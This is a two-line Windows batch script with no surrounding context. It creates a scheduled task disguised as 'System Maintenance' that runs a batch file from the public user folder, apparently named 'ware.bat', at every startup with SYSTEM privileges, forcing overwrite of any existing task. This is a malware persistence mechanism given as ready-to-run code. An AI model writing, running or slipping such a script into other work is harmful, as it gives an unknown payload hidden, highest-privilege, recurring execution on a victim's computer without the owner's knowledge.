@echo off
schtasks /create /tn "System Maintenance" /tr "C:\Users\Public\ware.bat" /sc onstart /ru SYSTEM /f
